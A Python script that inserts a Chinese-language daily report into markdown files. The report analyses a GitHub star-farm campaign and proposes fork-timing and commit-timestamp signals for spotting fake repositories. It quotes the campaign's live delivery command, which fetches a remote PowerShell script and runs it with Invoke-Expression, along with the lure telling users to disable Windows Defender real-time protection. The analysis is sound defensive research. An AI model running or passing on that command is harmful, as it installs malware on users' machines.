#!/usr/bin/env python3
"""Insert the 2026-11-07 section at the top of daily-report.md and indexes/trend-index.md."""
import re, os

BASE = '/home/lohasle/aiutil-github-researcher/'

DR_SECTION = """## 2026-11-07
**核心主题：** 本日最值得记的不是任何单一项目的星数，而是**「热度」这一指标在 2026-11-06 这一天被彻底证伪了一次，而且这一次可以做到逐条复现**：当日 GitHub 新建且 ≥30⭐ 的仓库共 **205 个**，其中 **178 个（86.8%）体积 ≤20 KB**、**178 个 fork 数为 0**、**95 个的 star 值落在 213–221 这一条窄带内**（其中 29 个精确等于 220⭐）——**⭐⭐⭐ 而本日报逐个抓取其中 91 个的 README 后确认：它们携带的是同一条可执行投放指令 `irm https://git-software.cc/ps/Setup.ps1 | Invoke-Expression`，并附带「若被杀毒软件拦截，请暂停 Windows 安全中心的实时保护」的指示；该域名在 2026-11-07 快照时刻实测返回 HTTP 200、8,881 字节、且首行即为 PowerShell 混淆器变量赋值语句（`$__pso_af3f65335ffb439b96c61569fc1336c4 = @{i=$MyInvocation;...}`），本日报按静态分析处理，未执行**。**⭐⭐ 与这批农场同框出现的第二个簇，是本日最锋利的一次「宣称与实现不一致」的现场取证**：`HerdBuilderEstimate/roblox-studio-mcp`（427⭐ ⑂260 · **fork/star 61%** · 4 commits · 5 文件 · 7 KB）自述是「Node.js/TypeScript 编写的 MCP server」，但 `repos/{owner}/{repo}` 的 `language` 字段是 **Python**、根树只有 `.gitignore / LICENSE / README.md / config.py / utils.py` 五个文件，且 `utils.py` 的内容是 `\"\"\"Utility helpers for starter.\"\"\"` + 一个 `process(limit)` 返回 `[item * 2 for item in range(limit)]` 的函数；它的姊妹仓库 `PulverizeLink/roblox-performance-tool`（426⭐ ⑂386 · **fork/star 91%**）的 `main.py` 写的是 `from utils import build`，而 `utils.py` **在仓库里根本不存在（API 返回 404）**；`Lowbetweentrim/crypto-portfolio-tracker`（425⭐ ⑂358）与 `phaseboulderfetter/discord-quest-completer`（425⭐ ⑂332）是**逐字节相同的模板**——`.gitignore` 的 md5 四家完全一致（`e18f025c87b71b9fe481f53ac6e8235d`），`config.py` 的 docstring 是 `\"\"\"Configuration for starter.\"\"\"`，**而四个仓库的 README 只替换了产品名**——**⭐⭐⭐⭐ 即这四个 425–427⭐ 的仓库在 2026-11-06 这一天里共用同一套「模板骨架」，而其中两家的代码连 import 都无法解析。**第三，与这批同框的三个真项目，恰好是本日最值得学的三种「把不确定性写进输出」的做法**：`voyager-so/vork`（197⭐ · 1,502 blobs · Rust + Slang · **`license.spdx_id` 为 NOASSERTION，且 LICENSE 首行即写明「vork is source-available. It is free to use during the research preview… **It is not open source.**」** · 禁「offer vork as a hosted or managed service in which other people submit scenes」）；`JosssphZhou/poki`（406⭐ ⑂83 · AGPL-3.0-only · 23 commits · 2 contributors）的 `docs/verification.md` 把「触摸写了进去」与「设备确认了」分成两件事（「`sent: true` only means the touch was written to the connection. The device does not acknowledge it」）并逐条记录**没赢的地方**（「In one landscape game, taps on button coordinates had no effect… The cause is unknown.」）；`majorminorlabs/hermes-voice`（424⭐ · 35 commits）的 `DECISIONS.md` 用 19 条编号决策逐条记录「为什么这么选、放弃了什么」，包括第 9 条「**Only 2026.10.4 was tested… Lower it after testing older versions.**」与第 16 条「**Device scope narrowed to Echo… The T-Deck Plus / ESP32 ESPHome work (phase 3) was not done**」。**⭐⭐⭐⭐⭐ 而本日最有价值的一条方法论结论，是判据本身**：**不要看 star 数，也不要看 fork 数 —— 要看 fork 的时间分布与账号年龄分布。** 本日报实测到四个仓库的 fork 间隔中位数分别是 **5 秒**（roblox-studio-mcp，96.9% 的间隔 ≤10 秒）、**6 秒**（roblox-performance-tool，94.5%）、**73 秒**（sheeridVerify，8.9%，且 12 个抽样账号创建时间跨越 11 年）、**496 秒**（discord-id-osint-checker，5.6%）；**⭐⭐⭐⭐⭐ 而 fork 总数分别是 260 / 386 / 360 / 73 —— 按总数排序会得到一个完全误导的结论。** 同日另有两个次级发现：**⭐⭐ `devvmhq/devvm` 有 600 个 commit、最早 commit 在 2026-10-24，但仓库 `created_at` 是 2026-11-06T07:02:30Z（因为当天迁入了当天新建的组织 `devvmhq`）——这是本日报记录的第三个「`created_at` 会说谎」的案例；⭐⭐ `Tropicaldrescoop/discord-id-osint-checker`（329⭐ ⑂73）则是一个全新的形态：它有完整的设计渲染流水线（`design/` + Playwright）与异常认真的 `CREDITS.md` 许可表，但**根树里没有一行应用源码**，交付物是唯一的 111.7 MB 未签名 `Flake-setup.exe`，而 CI 只跑 `node --check design/src/ui.js`；更关键的是**它的 43 个 commit 只落在 2 个秒值上（21 与 22）**——**⭐⭐⭐⭐⭐ 本日报据此提取了一条几乎零成本的新判据：commit 时间戳的「秒字段熵」（poki 20 个不同秒值 / hermes-voice 25 / devvm 49 / Flake 仅 2）。**

"""

TI_SECTION = """## 2026-11-07

### 本日新增项目

| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
|---|---:|---:|---:|---:|---|---:|---:|---|
| `voyager-so/vork` | 197 | 13 | 6.6% | 4 | Rust | — | 1（1,502 blobs） | 观察型 |
| `JosssphZhou/poki` | 406 | 83 | 20.4% | 1 | TypeScript/JS | — | 23 | 生产可用 |
| `majorminorlabs/hermes-voice` | 424 | 20 | 4.7% | 3 | Python | 411 KB | 35 | 工具型 |
| `JenkinWoo/sheeridVerify` | 540 | 358 | 66% | 0 | JavaScript | 408 KB | 1 | 观察型 |
| `HerdBuilderEstimate/roblox-studio-mcp` | 427 | 260 | 61% | 8 | Python（自述 Node.js/TS） | 7 KB | 4 | 观察型（反例样本） |
| `devvmhq/devvm` | 116 | 2 | 1.7% | 1 | Go | — | 600 | 基础设施候选 |
| `Tropicaldrescoop/discord-id-osint-checker` | 329 | 73 | 21% | 0 | HTML | 3172 KB | 43 | 观察型（待核验样本） |

**⭐⭐⭐⭐⭐ 本表最重要的一列是 fork/star，而不是 ⭐。** farm 那四个仓库是 61%–91%，而同一份榜单上三个真项目是 4.7%–20.4% —— **但单看这一列仍会误判**，必须配合下面的 fork 时间分布表。

### ⭐⭐⭐⭐⭐ fork 时间分布（本日报新提取的判据）

| 仓库 | forks | 间隔中位数 | p10 / p90 | ≤10s 占比 | 时间跨度 | 判定 |
|---|---:|---:|---|---:|---|---|
| `roblox-studio-mcp` | 260 | **5.0 s** | 3 / 6 s | **96.9%** | 27 分 35 秒 | 机器 |
| `roblox-performance-tool` | 386 | **6.0 s** | 5 / 8 s | **94.5%** | 44 分钟 | 机器 |
| `sheeridVerify` | 360 | **73.0 s** | 12 / 277 s | **8.9%** | 12.5 小时 | 真人 |
| `discord-id-osint-checker` | 73 | **496 s** | 19 / 1415 s | **5.6%** | 12.7 小时 | 中间态，待观察 |

**⭐⭐⭐⭐⭐ 按 fork 总数排序是错的**：360 > 260 > 73 > 386 会把 sheeridVerify 排在农场前面，而它的间隔中位数是 73 秒、抽样 12 个 fork 拥有者账号创建时间跨越 2015–2026 共 11 年。

### ⭐⭐⭐⭐⭐ commit 时间戳的秒字段熵（同日新判据）

| 仓库 | commits | 不同秒值数 | author==committer | commit 时间跨度 |
|---|---:|---:|---:|---|
| `JosssphZhou/poki` | 23 | **20** | 19/23 | 2026-11-05..06 |
| `majorminorlabs/hermes-voice` | 35 | **25** | 35/35 | 2026-11-05..06 |
| `devvmhq/devvm` | 100（首页） | **49** | 98/100 | 2026-11-05..06 |
| `HerdBuilderEstimate/roblox-studio-mcp` | 4 | 4 | 4/4 | 2026-11-06 |
| `Tropicaldrescoop/discord-id-osint-checker` | 43 | **2** | 43/43 | 2026-08-13..10-30（回填） |

**43 个 commit 只落在 2 个秒值上（21 与 22），且 39/43 的消息前缀是 `assets:` 或 `design:` —— 合成痕迹。**

### 持续跟踪项目状态

| 项目 | 变化 | 说明 |
|---|---|---|
| `interplains/zero-breach` | slug 修正 | 档案为 `projects/zero-breach.md`，此前生成的 `projects/zero-breach-toolkit.html` 是**指向从未存在过的源档案的坏链接**，本日报已修正 |
| `voyager-so/vork` | 新增 | `license.spdx_id` = NOASSERTION **是作者主动选择**（LICENSE 首行写明「It is not open source」）—— 与「NOASSERTION 但 LICENSE 其实清晰可辨」是性质相反的两类问题 |
| `majorminorlabs/hermes-voice` | 新增 | 本日报记录到的**第三种边界结构化形态**（前两种：vork 的许可声明、poki 的验证文档），本形态为**决策契约**（`DECISIONS.md` 19 条） |
| `devvmhq/devvm` | 新增 | 第三个「`created_at` 说谎」案例（仓库当天创建、600 commits 起始于 13 天前，因迁入当天新建的组织） |

### 排名变化

- **新增**：vork / poki / hermes-voice / sheeridVerify / roblox-studio-mcp / devvm / discord-id-osint-checker
- **本日无既有项目发生可核验的显著排名变动**（自 2026-10-30 以来本仓库无新日报，2026-11-01..06 的日报文件在本仓库中不存在，本日为首个可核验窗口）

"""

def prepend(path, section, must_contain):
    p = BASE + path
    s = open(p, encoding='utf-8').read()
    if must_contain in s[:4000]:
        print(f"  {path}: ALREADY PRESENT, skip")
        return
    open(p, 'w', encoding='utf-8').write(section + s)
    print(f"  {path}: inserted {len(section)} chars (was {len(s)})")

print("=== inserting ===")
prepend('daily-report.md', DR_SECTION, '## 2026-11-07')
prepend('indexes/trend-index.md', TI_SECTION, '## 2026-11-07')
